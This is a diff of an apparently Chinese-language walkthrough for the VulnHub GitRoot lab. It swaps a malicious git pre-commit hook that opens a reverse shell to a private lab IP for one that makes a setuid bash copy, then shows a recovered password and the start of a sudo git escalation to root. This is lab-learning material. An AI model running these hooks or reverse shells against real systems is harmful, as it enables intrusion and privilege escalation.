@@ -2,7 +2,7 @@
 
 2025.03.01 https://www.vulnhub.com/entry/gitroot-1,488/
 
-[video]()
+[video](https://www.bilibili.com/video/BV1GtXZYsEHz/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)
 
 ## Ip
 
@@ -129,26 +129,25 @@ Thanks!
 
 根据提示说添加一个 zip 到 jen/public/repos/ 它会自解压，然后提交到自己的 repo 中，这个文件是 jen 用户创建的。
 
-看看能不能在 git 上得到提权的路径，使用钩子进行提权：
+看看能不能在 git 上得到提权的路径，使用钩子进行提权（钩子的原理：当你执行一个 Git 命令（如 git commit 或 git push）时，Git 会首先检查".git/hooks"目录下是否存在对应的 hook 脚本，如果存在，则会触发执行这个脚本。）：
 
 ```
 cd /tmp
 mkdir repo
 cd repo
 git init
-echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"' > ".git/hooks/pre-commit"
-# echo 'exec -c "cp /bin/bash /tmp/jenbash; chmod +xs /tmp/jenbash"' > ".git/hooks/pre-commit"
+echo 'cp /bin/bash /tmp/jenbash; chmod +xs /tmp/jenbash' > ".git/hooks/pre-commit"
 chmod 777 ".git/hooks/pre-commit"
 7z a rev.zip .git
 cp rev.zip /home/jen/public/repos/
 ```
 
-在 kali 上创建监听等待反弹，等待几分钟发现得到了反弹的 shell：
+等待 1 分钟在 tmp 目录下发现 jenbash ：
 
 ```
-jen@GitRoot:~/private/repo$ id
-id
-uid=1003(jen) gid=1003(jen) groups=1003(jen)
+beth@GitRoot:/tmp/repo$ /tmp/jenbash -p
+jenbash-5.0$ id
+uid=1001(beth) gid=1001(beth) euid=1003(jen) egid=1003(jen) groups=1003(jen),1001(beth)
 ```
 
 同时看到了解压的脚本：
@@ -173,7 +172,7 @@ rm -f /home/jen/public/repos/*
 |2,1,1590471908,47,"binzpbeocnexoe"
 ```
 
-可能是 jen 的密码 sudo -l 输入 binzpbeocnexoe 显示 (ALL) /usr/bin/git ，现在可以直接提权到 root 了：
+可能是 jen 或者是 root 用户的密码 sudo -l 输入 binzpbeocnexoe 显示 (ALL) /usr/bin/git ，现在可以直接提权到 root 了：
 
 ```
 sudo -u root git help config
